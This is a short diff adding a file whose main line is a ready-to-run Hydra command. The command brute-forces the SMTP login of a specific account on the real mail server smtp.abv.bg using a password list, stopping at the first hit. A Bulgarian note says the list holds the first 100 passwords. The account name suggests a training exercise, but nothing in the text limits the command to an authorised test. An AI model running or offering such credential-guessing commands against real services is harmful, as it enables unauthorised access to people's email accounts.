@@ -1,0 +1,3 @@
+hydra -S -l qa_academy_ninja@abv.bg -P pass.txt -f -s 465 smtp.abv.bg smtp 
+
+Файлът е с 1-вите 100 пароли.
